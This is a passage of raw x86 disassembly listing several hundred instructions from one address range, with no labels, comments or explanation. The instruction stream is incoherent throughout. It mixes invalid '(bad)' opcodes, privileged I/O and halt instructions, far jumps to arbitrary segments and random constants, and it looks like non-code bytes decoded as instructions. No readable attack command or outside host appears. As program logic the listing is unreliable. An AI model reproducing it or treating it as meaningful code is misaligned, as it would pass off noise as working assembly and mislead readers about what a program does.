  41b38b:	jmp    0x41b3e9
  41b38d:	outs   dx,BYTE PTR ds:[esi]
  41b38e:	loope  0x41b402
  41b390:	repnz pop ecx
  41b392:	xchg   esi,eax
  41b393:	cmp    DWORD PTR [ebx+edi*4],esp
  41b396:	add    esi,DWORD PTR [eax-0x61]
  41b399:	pop    edx
  41b39a:	cmp    bh,BYTE PTR [ebp-0x9c92234]
  41b3a0:	push   ecx
  41b3a1:	leave  
  41b3a2:	or     eax,0xf58968ba
  41b3a7:	dec    eax
  41b3a8:	push   edi
  41b3a9:	sbb    edx,eax
  41b3ab:	jne    0x41b37b
  41b3ad:	jns    0x41b3c4
  41b3af:	mov    esp,0x123be1f1
  41b3b4:	nop
  41b3b5:	rol    DWORD PTR [edx+0x55],1
  41b3b8:	stos   DWORD PTR es:[edi],eax
  41b3b9:	mov    cl,0xf9
  41b3bb:	push   ebx
  41b3bc:	dec    edi
  41b3bd:	imul   edx,DWORD PTR [ecx+0x7c],0xffffffc1
  41b3c1:	rol    DWORD PTR [ebx-0x9e88594],0x57
  41b3c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3c9:	mov    WORD PTR [ebx],fs
  41b3cb:	jecxz  0x41b3e0
  41b3cd:	retf   
  41b3ce:	pop    esi
  41b3cf:	dec    esi
  41b3d0:	mov    ebp,ds
  41b3d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3d3:	ins    BYTE PTR es:[edi],dx
  41b3d4:	int3   
  41b3d5:	push   ecx
  41b3d6:	jnp    0x41b3fd
  41b3d8:	sub    edx,DWORD PTR [eax]
  41b3da:	cdq    
  41b3db:	or     eax,0xec6cec2f
  41b3e0:	add    eax,0xa2b860bf
  41b3e5:	les    esi,FWORD PTR [esi-0x1235b8ef]
  41b3eb:	mov    cl,0x37
  41b3ed:	mov    esi,0x8e446518
  41b3f2:	retf   0x8315
  41b3f5:	sbb    edx,ebp
  41b3f7:	cmp    dh,bh
  41b3f9:	inc    eax
  41b3fa:	mov    dh,0x17
  41b3fc:	cdq    
  41b3fd:	inc    esi
  41b3fe:	jno    0x41b410
  41b400:	ss aaa 
  41b402:	pop    edi
  41b403:	arpl   WORD PTR [esi+0x314b7228],bx
  41b409:	mov    eax,ds:0xc9378f77
  41b40e:	stos   DWORD PTR es:[edi],eax
  41b40f:	dec    ecx
  41b410:	add    al,0x9d
  41b412:	xor    BYTE PTR [eax],al
  41b414:	sub    al,0x79
  41b416:	mov    dl,BYTE PTR [ecx]
  41b418:	pop    es
  41b419:	push   ecx
  41b41a:	(bad)
  41b41d:	cmp    BYTE PTR [eax+0x589e0dd8],0x23
  41b424:	rcl    DWORD PTR [edx],0x5f
  41b427:	xchg   ebp,eax
  41b428:	lods   al,BYTE PTR ds:[esi]
  41b429:	or     BYTE PTR [edi-0x20],ch
  41b42c:	outs   dx,BYTE PTR ds:[esi]
  41b42d:	pop    ds
  41b42e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b42f:	jl     0x41b43b
  41b431:	rcl    BYTE PTR [ebx+0x12],cl
  41b434:	mov    esi,DWORD PTR [ebx-0x30]
  41b437:	(bad)  
  41b438:	sbb    BYTE PTR [edx-0x38],ah
  41b43b:	jmp    0x3fa0:0x663ddbf8
  41b442:	jmp    0x9fd2:0x69c70c37
  41b449:	dec    edx
  41b44a:	push   ecx
  41b44b:	xchg   ebp,eax
  41b44c:	jb     0x41b4ba
  41b44e:	xchg   esp,eax
  41b44f:	jo     0x41b3ee
  41b451:	retf   
  41b452:	xchg   esp,eax
  41b453:	in     al,0xa
  41b455:	hlt    
  41b456:	jno    0x41b415
  41b458:	mov    ds:0xcdf6b6f5,al
  41b45d:	pop    edi
  41b45e:	jle    0x41b474
  41b460:	mov    ecx,0xb8376bc3
  41b465:	lods   eax,DWORD PTR ds:[esi]
  41b466:	iret   
  41b467:	pop    esi
  41b468:	push   0xffffffb3
  41b46a:	(bad)  
  41b46b:	fxch   st(3)
  41b46d:	fs xchg edx,eax
  41b46f:	stos   BYTE PTR es:[edi],al
  41b470:	push   es
  41b471:	je     0x41b4b2
  41b473:	and    DWORD PTR [esi+0x5e],0xffffffb3
  41b477:	test   eax,0x3d6df567
  41b47c:	sbb    al,0xbc
  41b47e:	les    eax,FWORD PTR [esi]
  41b480:	enter  0xf2d,0xf4
  41b484:	fisub  WORD PTR [edi-0xa]
  41b487:	fsub   QWORD PTR [ebp-0x2a5663e1]
  41b48d:	fisub  DWORD PTR ds:0x726d18c5
  41b493:	sub    DWORD PTR [edx+0x3c],edx
  41b496:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b497:	repnz push ecx
  41b499:	and    esi,esp
  41b49b:	jno    0x41b462
  41b49d:	jno    0x41b4b6
  41b49f:	imul   edx,ebx,0x73
  41b4a2:	mov    cl,0x6e
  41b4a4:	ss and eax,0x7cf6f223
  41b4aa:	inc    eax
  41b4ab:	not    edi
  41b4ad:	mov    ds:0xce3c4c90,eax
  41b4b2:	jl     0x41b43c
  41b4b4:	fcom   QWORD PTR [edi]
  41b4b6:	ficom  DWORD PTR [ecx-0x41]
  41b4b9:	rol    BYTE PTR [edx+ebx*4],0x52
  41b4bd:	hlt    
  41b4be:	(bad)  es:[esi+0xe456904]
  41b4c5:	adc    BYTE PTR [eax-0x1],0x67
  41b4c9:	test   al,0x51
  41b4cb:	pop    esp
  41b4cc:	gs add al,0x87
  41b4cf:	jbe    0x41b531
  41b4d1:	sub    dl,dh
  41b4d3:	loopne 0x41b481
  41b4d5:	cmp    ebp,DWORD PTR [ecx+0x26ee5545]
  41b4db:	(bad)  
  41b4dc:	(bad)  
  41b4de:	out    0x6,eax
  41b4e0:	push   ss
  41b4e1:	int3   
  41b4e2:	in     al,dx
  41b4e3:	(bad)  
  41b4e4:	in     eax,dx
  41b4e5:	test   DWORD PTR [edi-0x68],eax
  41b4e8:	int3   
  41b4e9:	or     al,cl
  41b4eb:	fdivr  DWORD PTR [esi]
  41b4ed:	cmp    eax,0xc6d5ba73
  41b4f2:	(bad)  
  41b4f3:	push   ebp
  41b4f4:	out    0xab,eax
  41b4f6:	mov    al,ds:0x4dcabac1
  41b4fb:	pop    ebp
  41b4fc:	jl     0x41b4c4
  41b4fe:	add    edx,edi
  41b500:	(bad)  
  41b501:	(bad)  
  41b503:	push   ds
  41b504:	bound  edi,QWORD PTR [ecx-0x1d9073bd]
  41b50a:	cmp    ch,BYTE PTR [edx+0x25dffacb]
  41b510:	adc    ch,BYTE PTR [edx-0x7de6494e]
  41b516:	jne    0x41b510
  41b518:	cli    
  41b519:	call   DWORD PTR [ecx-0x6c141e5e]
  41b51f:	addr16 mov bh,0x72
  41b522:	imul   edi,edi,0x234cd8be
  41b528:	inc    esi
  41b529:	inc    edi
  41b52a:	stos   DWORD PTR es:[edi],eax
  41b52b:	repz adc al,0x75
  41b52e:	sub    bh,dh
  41b530:	out    dx,al
  41b531:	in     al,0x1d
  41b533:	mov    al,ds:0x5ad34946
  41b538:	into   
  41b539:	outs   dx,BYTE PTR ds:[esi]
  41b53a:	push   0xffffffd9
  41b53c:	daa    
  41b53d:	inc    ecx
  41b53e:	jecxz  0x41b55a
  41b540:	pop    esp
  41b541:	add    al,0xbd
  41b543:	das    
  41b544:	out    dx,eax
  41b545:	adc    DWORD PTR [eax],ebp
  41b547:	imul   eax,DWORD PTR [ecx],0xffffffc6
  41b54a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b54b:	jmp    0x49f27051
  41b550:	jecxz  0x41b525
  41b552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b553:	mov    ah,bh
  41b555:	push   esp
  41b556:	add    ah,al
  41b558:	adc    ebx,DWORD PTR [edx]
  41b55a:	rcl    al,1
  41b55c:	dec    ebp
  41b55d:	imul   ecx,DWORD PTR [ecx-0x7d],0x8aad8633
  41b564:	sub    esi,ebp
  41b566:	sub    eax,DWORD PTR [eax+eiz*8+0x10042176]
  41b56d:	cmp    edi,esp
  41b56f:	sub    BYTE PTR [edi-0x67],al
  41b572:	and    dl,dl
  41b574:	jl     0x41b5c7
  41b576:	aad    0x58
  41b578:	in     al,0x9c
  41b57a:	xchg   edi,eax
  41b57b:	aad    0x1e
  41b57d:	mov    edx,0x996bdf8f
  41b582:	cmp    BYTE PTR [edi+0x28],al
  41b585:	xor    dl,dl
  41b587:	inc    edi
  41b588:	xchg   edx,eax
  41b589:	gs sti 
  41b58b:	adc    BYTE PTR [esi-0x441ef766],cl
  41b591:	(bad)  [esi]
  41b593:	scas   eax,DWORD PTR es:[edi]
  41b594:	imul   ebx,DWORD PTR [ebx+0x28],0xa6bb3e56
  41b59b:	ret    
  41b59c:	ss clc 
  41b59e:	mov    edi,0xbb0972d5
  41b5a3:	jg     0x41b564
  41b5a5:	xchg   edi,ebp
  41b5a7:	mov    al,ds:0x18f2e222
  41b5ac:	std    
  41b5ad:	xchg   edx,eax
  41b5ae:	inc    eax
  41b5af:	aad    0x32
  41b5b1:	cmp    BYTE PTR [ebx-0xed22e74],al
  41b5b7:	ror    BYTE PTR [edi+ebx*2-0x9cf91b2],cl
  41b5be:	iret   
  41b5bf:	repnz lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5c2:	pmulhuw mm1,QWORD PTR [esi]
  41b5c5:	cmc    
  41b5c6:	sbb    DWORD PTR [ecx-0x76],0xee01a310
  41b5cd:	push   0xf
  41b5cf:	xor    al,0x6f
  41b5d1:	push   ebp
  41b5d2:	addr16 dec ebp
  41b5d4:	shl    DWORD PTR [ecx-0x60],1
  41b5d7:	mov    cl,0x3
  41b5d9:	push   esp
  41b5da:	sub    eax,0xde03c5ea
  41b5df:	mov    ah,0xc
  41b5e1:	sahf   
  41b5e2:	icebp  
  41b5e3:	imul   edi,DWORD PTR [ebx-0x4313524],0xf6e82d0c
  41b5ed:	popf   
  41b5ee:	xchg   ebp,eax
  41b5ef:	pop    eax
  41b5f0:	lahf   
  41b5f1:	xor    BYTE PTR [esi],0xd2
  41b5f4:	cmp    DWORD PTR [edi-0x3],0x28
  41b5f8:	add    DWORD PTR gs:[ecx+0x74b5c1db],0xffffffed
  41b600:	mov    bl,bl
  41b602:	dec    eax
  41b603:	jb     0x41b641
  41b605:	leave  
  41b606:	add    eax,0x68f35ed1
  41b60b:	(bad)  
  41b60c:	or     al,0x80
  41b60e:	lahf   
  41b60f:	neg    ebp
  41b611:	add    WORD PTR [ebp-0x5e47bed0],0x46
  41b619:	mov    cl,BYTE PTR [edx+ecx*2-0x4b6fa13b]
  41b620:	pop    edi
  41b621:	xchg   bh,bh
  41b623:	daa    
  41b624:	jmp    0x41b643
  41b626:	xchg   edi,eax
  41b627:	adc    esi,ebx
  41b629:	lods   al,BYTE PTR ds:[esi]
  41b62a:	or     DWORD PTR [ebx],eax
  41b62c:	lods   al,BYTE PTR ds:[esi]
  41b62d:	cmp    al,0xa
  41b62f:	xchg   esi,eax
  41b630:	lods   eax,DWORD PTR ds:[esi]
  41b631:	push   ecx
  41b632:	nop
  41b633:	retf   
  41b634:	dec    ebx
  41b635:	jecxz  0x41b5ba
  41b637:	inc    esi
  41b638:	out    0xb2,al
  41b63a:	sbb    BYTE PTR [ecx-0xf332b71],al
  41b640:	sar    BYTE PTR [edx-0x7d],1
  41b643:	push   ecx
  41b644:	popf   
  41b645:	and    ebx,DWORD PTR [ebx+edi*2+0x47418691]
  41b64c:	lahf   
  41b64d:	adc    eax,0x6d6dc4ba
  41b652:	sbb    dl,cl
  41b654:	sbb    BYTE PTR [esi+edx*8-0x34a29e8c],bl
  41b65b:	and    eax,0xb4cdf497
  41b660:	and    al,0xb8
  41b662:	nop
  41b663:	adc    esi,esp
  41b665:	sub    esp,DWORD PTR [ecx+edx*2]
  41b668:	mov    ebp,0xfa301ca0
  41b66d:	push   ebx
  41b66e:	ror    DWORD PTR [edx],0x31
  41b671:	jne    0x41b64a
  41b673:	je     0x41b689
  41b675:	test   DWORD PTR [ebx+0x276b98f5],edx
  41b67b:	fnstenv [eax-0x60]
  41b67e:	xchg   ebp,eax
  41b67f:	and    DWORD PTR [ecx],esi
  41b681:	psrlw  mm3,mm6
  41b684:	jnp    0x41b702
  41b686:	stos   BYTE PTR es:[edi],al
  41b687:	repz xor BYTE PTR [ecx],bh
  41b68a:	das    
  41b68b:	aad    0x25
  41b68d:	push   edx
  41b68e:	push   ss
  41b68f:	xchg   esi,eax
  41b690:	dec    edx
  41b691:	ja     0x41b6be
  41b693:	or     DWORD PTR [ebp+ebx*1-0x77],ebx
  41b697:	in     al,dx
  41b698:	sbb    al,0x91
  41b69a:	add    ebx,DWORD PTR [ecx+0x3857e7d]
  41b6a0:	ror    DWORD PTR [edi-0x4eb461da],cl
  41b6a6:	(bad)  
  41b6a7:	jp     0x41b68a
  41b6a9:	(bad)  
  41b6aa:	outs   dx,DWORD PTR ds:[esi]
  41b6ab:	popa   
  41b6ac:	jmp    0xee196d1d
  41b6b1:	aad    0xf7
  41b6b3:	push   eax
  41b6b4:	push   es
  41b6b5:	lahf   
  41b6b6:	mov    WORD PTR [esi],?
  41b6b8:	xchg   ebp,eax
  41b6b9:	outs   dx,DWORD PTR ds:[esi]
  41b6ba:	ins    DWORD PTR es:[edi],dx
  41b6bb:	sbb    eax,0x49300db5
  41b6c0:	add    ch,BYTE PTR ds:[ebx-0x61]
  41b6c4:	dec    eax
  41b6c5:	call   0xbb04de73
  41b6ca:	mov    ecx,0x65545c50
  41b6cf:	jmp    DWORD PTR ds:0x23be7c29
  41b6d5:	dec    ebp
  41b6d6:	(bad)  
  41b6d7:	cli    
  41b6d8:	dec    BYTE PTR [edx+ebx*8+0x158cbb1e]
  41b6df:	scas   al,BYTE PTR es:[edi]
  41b6e0:	mov    bh,0x3
  41b6e2:	push   0x6792451f
  41b6e7:	pop    ebx
  41b6e8:	pop    edx
  41b6e9:	stos   DWORD PTR es:[edi],eax
  41b6ea:	daa    
  41b6eb:	(bad)  
  41b6ec:	jmp    0xec9c:0x67cbe83d
  41b6f3:	push   edx
  41b6f4:	inc    ebp
  41b6f5:	out    0xb3,al
  41b6f7:	fisttp QWORD PTR [ecx]
  41b6f9:	repz and BYTE PTR [ecx+0x7f],ch
  41b6fd:	repnz add ebp,DWORD PTR [ecx+eax*8-0x6acd1d7d]
  41b705:	add    BYTE PTR [ecx],0xf0
  41b708:	lock add BYTE PTR [edi+0x203e2efe],0xdd
  41b710:	push   ss
  41b711:	ins    DWORD PTR es:[edi],dx
  41b712:	rcr    bl,cl
  41b714:	test   DWORD PTR [eax],0x7ee1ad1c
  41b71a:	das    
  41b71b:	test   DWORD PTR [edi+0x3e],edi
  41b71e:	inc    edx
  41b71f:	adc    edi,DWORD PTR [eax-0x3]
  41b722:	nop
  41b723:	push   eax
  41b724:	and    BYTE PTR [ecx-0x790c8261],bl
  41b72a:	dec    eax
  41b72b:	fsub   QWORD PTR [edi+0x14]
  41b72e:	add    ch,BYTE PTR [ecx-0x19]
  41b731:	loope  0x41b6b7
  41b733:	test   al,0xe
  41b735:	in     eax,0x3a
  41b737:	adc    ebp,ecx
  41b739:	xchg   ebx,eax
  41b73a:	and    DWORD PTR [ebx+0x65f1087f],edi
  41b740:	cmp    ecx,DWORD PTR ss:[ecx+0x45]
  41b744:	iret   
  41b745:	jl     0x41b79b
  41b747:	xor    BYTE PTR [eax-0x22],dh
  41b74a:	sub    ah,dh
  41b74c:	xchg   ebx,eax
  41b74d:	vxorps ymm2,ymm0,YMMWORD PTR [ecx-0x6ddd5299]
  41b755:	mov    DWORD PTR [ecx+0x2e90727d],eax
  41b75b:	popa   
  41b75c:	inc    ecx
  41b75d:	cwde   
  41b75e:	mov    BYTE PTR [ecx+eiz*2+0x4f],dh
  41b762:	and    ebx,ebp
  41b764:	lds    ebx,FWORD PTR [ebx]
  41b766:	add    eax,DWORD PTR [ebp-0x55]
  41b769:	fnstenv [ecx-0x47db6367]
  41b76f:	dec    ebp
  41b770:	into   
  41b771:	aaa    
  41b772:	sub    eax,0x509fad2f
  41b777:	mov    ecx,0xecbbe6c9
  41b77c:	mov    edx,0xaa45f19c
  41b782:	sahf   
  41b783:	cmp    ah,BYTE PTR [ecx+ecx*8]
  41b786:	psraw  mm5,QWORD PTR [ebx-0x55]
  41b78a:	mov    ?,WORD PTR [edi-0x270489db]
  41b790:	pop    esi
  41b791:	arpl   WORD PTR [ecx],dx
  41b793:	xchg   edx,eax
  41b794:	das    
  41b795:	sbb    esp,DWORD PTR [ecx+0x6b245451]
  41b79b:	pop    ecx
  41b79c:	stos   BYTE PTR es:[edi],al
  41b79d:	pop    edx
  41b79e:	jmp    0xa875:0x1b825186
  41b7a5:	call   0xdb68f11d
  41b7aa:	push   ebp
  41b7ab:	ror    eax,1
  41b7ad:	mov    bh,BYTE PTR [eax]
  41b7af:	sub    esi,esi
  41b7b1:	in     al,0x37
  41b7b3:	push   ebp
  41b7b4:	test   DWORD PTR [esp+ecx*1-0x38a14eb9],0xa8b511df
  41b7bf:	jbe    0x41b74a
  41b7c1:	imul   esp,DWORD PTR [ebx],0xfffffffa
  41b7c4:	lds    eax,FWORD PTR [ecx-0x46ab3a8e]
  41b7ca:	pop    es
  41b7cb:	repz in al,0xd9
  41b7ce:	cs mov bl,0x9e
  41b7d1:	xor    eax,0x7728692f
  41b7d6:	std    
  41b7d7:	xchg   ebp,eax
  41b7d8:	xchg   esi,eax
  41b7d9:	test   al,0x1e
  41b7db:	push   ds
  41b7dc:	or     DWORD PTR [eax-0x9],eax
  41b7df:	sub    DWORD PTR [ecx+0x77046dbd],eax
  41b7e5:	cwde   
  41b7e6:	stc    
  41b7e7:	mov    esp,0x8deec35f
  41b7ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7ed:	and    al,0x2d
  41b7ef:	repnz fs arpl di,bx
  41b7f3:	bound  edx,QWORD PTR [ebp+0x3a]
  41b7f6:	jno    0x41b7bb
  41b7f8:	cmp    DWORD PTR [edi+ebp*4-0x63],edx
  41b7fc:	dec    ebx
  41b7fd:	into   
  41b7fe:	mov    al,0x8e
  41b800:	push   edx
  41b801:	jnp    0x41b789
  41b803:	mov    dh,0x9a
  41b805:	add    eax,ecx
  41b807:	push   edx
  41b808:	push   0xffffffce
  41b80a:	and    DWORD PTR [ebp+0x4a62bdaa],eax
  41b810:	mov    bh,0x5b
  41b812:	push   0xb9a1ce92
  41b817:	push   ss
  41b818:	ror    DWORD PTR [ebp-0x1da40ee7],0x28
  41b81f:	mov    eax,0x4b418375
  41b824:	sbb    BYTE PTR [esi-0x21396caf],ch
  41b82a:	mov    ecx,0xd56222e9
  41b82f:	repz jl 0x41b7d4
  41b832:	lea    eax,[ecx]
  41b834:	outs   dx,DWORD PTR ds:[esi]
  41b835:	sar    DWORD PTR [ebx],0xb3
  41b838:	jne    0x41b877
  41b83a:	dec    ebx
  41b83b:	xchg   dl,dh
  41b83d:	out    dx,eax
  41b83e:	or     bh,BYTE PTR [esi+0x50]
  41b841:	mov    es,edi
  41b843:	xor    eax,0x117c7894
  41b848:	(bad)  
  41b849:	jmp    0x37dcd7ca
  41b84e:	out    dx,eax
  41b84f:	inc    esp
  41b850:	jns    0x41b85b
  41b852:	inc    esi
  41b853:	mov    bh,0x53
  41b855:	mov    dl,0xb3
  41b857:	inc    esp
  41b858:	ror    DWORD PTR [edi+eiz*1],1
  41b85b:	loopne 0x41b807
  41b85d:	jmp    FWORD PTR [ebp-0x4e]
  41b860:	das    
  41b861:	mov    al,BYTE PTR [eax-0x17]
  41b864:	fidivr WORD PTR gs:[ecx]
  41b867:	inc    edx
  41b868:	in     al,0xd3
  41b86a:	aas    
  41b86b:	sbb    DWORD PTR [ecx],ebx
  41b86d:	mov    bl,0x1c
  41b86f:	sbb    ecx,DWORD PTR [edx+0x10]
  41b872:	imul   esi,DWORD PTR [edx],0x8fb0ebb6
  41b878:	pop    ds
  41b879:	retf   
  41b87a:	ins    BYTE PTR es:[edi],dx
  41b87b:	gs jl  0x41b8fd
  41b87e:	mov    dh,0xc1
  41b880:	rcl    DWORD PTR [edi-0x6770c6bf],0x73
  41b887:	aaa    
  41b888:	cld    
  41b889:	jno    0x41b8c3
  41b88b:	xchg   ecx,eax
  41b88c:	retf   
  41b88d:	inc    ecx
  41b88e:	push   edi
  41b88f:	and    eax,0x609f871e
  41b894:	pop    ecx
  41b895:	cmp    BYTE PTR [eax-0x56],ch
  41b898:	rep lods eax,DWORD PTR ds:[esi]
  41b89a:	dec    ebp
  41b89b:	add    DWORD PTR [ebx],0x3a
  41b89e:	push   ecx
  41b89f:	xchg   edx,eax
  41b8a0:	sub    BYTE PTR [edx],bh
  41b8a2:	cmp    DWORD PTR [ebx],ebp
  41b8a4:	sub    al,0x1b
  41b8a6:	imul   ecx,DWORD PTR [edx+0x3e],0x4f2dfe4f
  41b8ad:	fmulp  st(2),st
  41b8af:	dec    ecx
  41b8b0:	push   cs
  41b8b1:	push   edi
  41b8b2:	and    al,BYTE PTR [edx-0x59dd3c13]
  41b8b8:	xchg   BYTE PTR [edi+edi*1-0x62adae08],ah
  41b8bf:	inc    ebx
  41b8c0:	mov    esp,0x7114fa3e
  41b8c5:	in     al,0x61
  41b8c7:	cld    
  41b8c8:	ret    0xbbe
  41b8cb:	fcmovne st,st(2)
  41b8cd:	xor    DWORD PTR [edi-0x4],edi
  41b8d0:	je     0x41b934
  41b8d2:	and    BYTE PTR [edx],ah
  41b8d4:	aas    
  41b8d5:	int    0x1e
  41b8d7:	dec    ebx
  41b8d8:	cld    
  41b8d9:	and    DWORD PTR [edi-0x154120b0],eax
  41b8df:	inc    esp
  41b8e0:	lock xchg edx,eax
  41b8e2:	adc    dh,bl
  41b8e4:	mov    esi,0x4cc3d0bf
  41b8e9:	and    DWORD PTR [ebx-0x20],0x39
  41b8ed:	mov    edi,0x7942e393
  41b8f2:	jae    0x41b945
  41b8f4:	adc    ecx,DWORD PTR [edi+0x33416b79]
  41b8fa:	push   ecx
  41b8fb:	sub    ebx,0x2
  41b8fe:	and    DWORD PTR [ebp+0x27f83476],esi
  41b904:	xor    DWORD PTR [edi+0xa],0xf50bc485
  41b90b:	pop    ebx
  41b90c:	in     eax,0x6a
  41b90e:	xchg   ebp,eax
  41b90f:	xlat   BYTE PTR ds:[ebx]
  41b910:	pop    eax
  41b911:	mov    al,0xc4
  41b913:	iret   
  41b914:	sti    
  41b915:	push   esp
  41b916:	ret    0x4c05
  41b919:	fsubr  QWORD PTR [edi]
  41b91b:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41b91d:	xchg   edx,eax
  41b91e:	and    DWORD PTR [ecx-0x6a8631df],ebp
  41b924:	dec    ebx
  41b925:	adc    ah,BYTE PTR [ecx-0x40]
  41b928:	inc    edx
  41b929:	inc    ebx
  41b92a:	inc    edx
  41b92b:	(bad)  
  41b92c:	fwait
  41b92d:	mov    esp,0xf320ea8f
  41b932:	int    0xf4
  41b934:	xchg   esp,eax
  41b935:	push   edi
  41b936:	pop    ecx
  41b937:	inc    eax
  41b938:	sbb    eax,DWORD PTR [ecx+0x8]
  41b93b:	lods   al,BYTE PTR ds:[esi]
  41b93c:	adc    bh,al
  41b93e:	es push esi
  41b940:	and    BYTE PTR [ebp-0x35],dl
  41b943:	jnp    0x41b8f2
  41b945:	sub    bl,dh
  41b947:	fwait
  41b948:	mov    ebx,0x450c1c67
  41b94d:	nop
  41b94e:	add    al,0x6c
  41b950:	retf   0x50db
  41b953:	xchg   ebp,eax
  41b954:	repnz cmp edx,DWORD PTR [eax-0x50]
  41b958:	pop    esp
  41b959:	jp     0x41b902
  41b95b:	and    ebx,ebp
  41b95d:	xchg   al,dh
  41b95f:	adc    al,0xd2
  41b961:	jge    0x41b9a2
  41b963:	xchg   ebx,eax
  41b964:	fist   DWORD PTR [ecx]
  41b966:	sub    BYTE PTR [edi],dh
  41b968:	sbb    esi,DWORD PTR [eax+ebp*8-0x15]
  41b96c:	sahf   
  41b96d:	and    ecx,ebx
  41b96f:	inc    eax
  41b970:	lods   eax,DWORD PTR ds:[esi]
  41b971:	xchg   edi,eax
  41b972:	gs jecxz 0x41b960
  41b975:	mov    al,0x53
  41b977:	cli    
  41b978:	sub    BYTE PTR [esi+0x15570707],dh
  41b97e:	and    bh,al
  41b980:	fld    TBYTE PTR [ebp-0x64]
  41b983:	mov    ds:0x5520fe73,eax
  41b988:	sub    DWORD PTR [ebx-0x37600433],ecx
  41b98e:	test   edx,ebp
  41b990:	push   edx
  41b991:	mov    al,0xed
  41b993:	fld    TBYTE PTR [esi]
  41b995:	pop    ds
  41b996:	pop    edi
  41b997:	mov    bl,BYTE PTR [edi+0x1a]
  41b99a:	sahf   
  41b99b:	jmp    0x509ac964
  41b9a0:	mov    WORD PTR ss:[ecx-0x6],es
  41b9a4:	retf   0x5f98
  41b9a7:	xchg   ecx,eax
  41b9a8:	mov    ah,BYTE PTR [ecx]
  41b9aa:	sub    dh,BYTE PTR [ebx]
  41b9ac:	jl     0x41b95d
  41b9ae:	pop    eax
  41b9af:	(bad)  
  41b9b0:	retf   
  41b9b1:	adc    eax,0x9f0e3dcc
  41b9b6:	rcl    DWORD PTR [edi+esi*2],1
  41b9b9:	sahf   
  41b9ba:	cmc    
  41b9bb:	stc    
  41b9bc:	stc    
  41b9bd:	xlat   BYTE PTR ds:[ebx]
  41b9be:	cli    
  41b9bf:	mov    cl,0xc
  41b9c1:	aad    0x75
  41b9c3:	sub    DWORD PTR [ebx-0x72],edx
  41b9c6:	in     al,dx
  41b9c7:	mov    ebx,0xb201ea7c
  41b9cc:	into   
  41b9cd:	sbb    BYTE PTR [esi-0x14639fb2],0xf6
  41b9d4:	stc    
  41b9d5:	add    dl,BYTE PTR [eax-0x763ed49b]
  41b9db:	cmp    BYTE PTR [esi-0x306b5ad9],ch
  41b9e1:	mov    DWORD PTR [ebp-0x1e],edx
  41b9e4:	mov    esi,DWORD PTR [ebp-0x5358239d]
  41b9ea:	jl     0x41b9b9
  41b9ec:	xchg   ebx,eax
  41b9ed:	cdq    
  41b9ee:	pop    ebx
  41b9ef:	add    BYTE PTR [edx+edx*1+0x10a8f38f],dh
  41b9f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9f7:	ja     0x41b9f4
  41b9f9:	dec    edi
  41b9fa:	jnp    0x41ba47
  41b9fc:	fisub  DWORD PTR [esi-0x74]
  41b9ff:	scas   al,BYTE PTR es:[edi]
  41ba00:	cmp    al,BYTE PTR ds:0xf1aa1bdb
  41ba06:	adc    eax,0x34413d95
  41ba0b:	mov    ch,0xfe
  41ba0d:	out    0x5f,al
  41ba0f:	jle    0x41ba08
  41ba11:	addr16 pop eax
  41ba13:	mov    es,WORD PTR [ecx-0x83a5fe6]
  41ba19:	and    cl,BYTE PTR [esi-0x49]
  41ba1c:	loope  0x41b9ba
  41ba1e:	pop    ebx
  41ba1f:	cld    
  41ba20:	aas    
  41ba21:	dec    ecx
  41ba22:	into   
  41ba23:	scas   al,BYTE PTR es:[edi]
  41ba24:	fiadd  WORD PTR [edi-0x7e]
  41ba27:	test   DWORD PTR [edi+0x19],esp
  41ba2a:	test   al,0xc6
  41ba2c:	cmp    ebp,DWORD PTR [ebx]
  41ba2e:	cmp    ch,al
  41ba30:	rol    BYTE PTR [edx],cl
  41ba32:	xor    eax,0x8454d82b
  41ba37:	cdq    
  41ba38:	dec    ebp
  41ba39:	mov    BYTE PTR [esi-0x5],0x9f
  41ba3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba3e:	lahf   
  41ba3f:	sub    ebp,DWORD PTR [edx+edx*8-0x5f985ff9]
  41ba46:	out    0x3c,eax
  41ba48:	or     ebp,ebp
  41ba4a:	es mov ecx,0xb30917d0
  41ba50:	adc    BYTE PTR [ebx],dl
  41ba52:	mov    ds:0x2e93c876,eax
  41ba57:	rol    DWORD PTR [esi-0x2e73ba42],0x7a
  41ba5e:	pop    ebx
  41ba5f:	imul   esp,DWORD PTR [eax+0x8f6b46f],0x179715d
  41ba69:	pop    esi
  41ba6a:	mov    ah,0xe2
  41ba6c:	in     eax,0xb4
  41ba6e:	adc    al,BYTE PTR [edx]
  41ba70:	dec    ebx
  41ba71:	sub    al,0x3b
  41ba73:	ret    0x8226
  41ba76:	repnz test BYTE PTR [edi+0x2],bl
  41ba7a:	inc    eax
  41ba7b:	imul   eax,DWORD PTR ds:0xf3269881,0x9e830794
  41ba85:	cmp    eax,0xc2688844
  41ba8a:	cmp    edi,ecx
  41ba8c:	jecxz  0x41ba62
  41ba8e:	or     BYTE PTR [ecx+0x31b70b41],cl
  41ba94:	mov    ah,0x25
  41ba96:	out    dx,al
  41ba97:	push   0xffffffde
  41ba99:	nop
  41ba9a:	sbb    al,0x1d
  41ba9c:	nop
  41ba9d:	cmp    BYTE PTR [ecx-0x6],al
  41baa0:	and    ah,BYTE PTR [edx+ebx*1-0x3d6a1a3a]
  41baa7:	sbb    eax,0x50098b44
  41baac:	mov    eax,ds:0xea611a15
  41bab1:	mov    WORD PTR [esi+edx*4+0x60d6eb88],fs
  41bab8:	push   cs
  41bab9:	and    BYTE PTR [esi+eiz*2],dl
  41babc:	idiv   ah
  41babe:	cld    
  41babf:	sub    bl,BYTE PTR [ebp+0x4]
  41bac2:	ins    DWORD PTR es:[edi],dx
  41bac3:	sbb    dl,dh
  41bac5:	push   edi
  41bac6:	xor    eax,0x63ac4650
  41bacb:	and    DWORD PTR [esi],esp
  41bacd:	mov    cl,0xff
  41bacf:	xchg   ebp,eax
  41bad0:	pop    edx
  41bad1:	push   0xffffff9f
  41bad3:	addr16 mov edx,0xe06f6eb0
  41bad9:	pop    eax
